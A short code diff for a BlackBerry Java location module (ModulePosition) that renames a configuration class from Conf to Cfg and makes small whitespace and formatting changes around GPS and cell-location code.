@@ -27,7 +27,7 @@ import net.rim.device.api.system.WLANInfo.WLANAPInfo;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.Status;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Check;
@@ -244,7 +244,7 @@ public final class ModulePosition extends BaseInstantModule implements
             //#ifdef DEBUG
             debug.trace("stopGps");
             //#endif
-            
+
             alarm.cancel();
             alarm = null;
 
@@ -284,7 +284,7 @@ public final class ModulePosition extends BaseInstantModule implements
         //final boolean gprs = !Device.isCDMA();
 
         if (Device.isGPRS()) {
-            if( ! Device.isSimEnabled()){
+            if (!Device.isSimEnabled()) {
                 //#ifdef DEBUG
                 debug.trace("locationCELL: sim not present");
                 //#endif
@@ -686,7 +686,7 @@ public final class ModulePosition extends BaseInstantModule implements
             int period = databuffer.readInt();
             final int type = databuffer.readInt();
 
-            if (Conf.GPS_ENABLED) {
+            if (Cfg.GPS_ENABLED) {
                 gpsEnabled = ((type & TYPE_GPS) != 0);
             } else {
                 //#ifdef DEBUG
